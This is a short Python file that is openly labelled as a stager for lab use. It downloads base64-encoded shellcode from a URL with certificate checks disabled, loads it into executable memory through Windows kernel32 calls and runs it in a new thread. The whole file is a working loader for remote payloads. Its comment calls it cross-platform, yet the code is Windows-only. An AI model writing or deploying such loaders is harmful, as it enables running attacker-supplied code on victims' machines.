import base64
import ctypes
import requests

# Cross-platform stager (lab use)
def run_stager(url):
    shellcode_b64 = requests.get(url, verify=False).text
    shellcode = base64.b64decode(shellcode_b64)
    ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    ctypes.windll.msvcrt.memcpy(ptr, shellcode, len(shellcode))
    handle = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

# Example usage:
# run_stager('https://127.0.0.1:5000/payload') 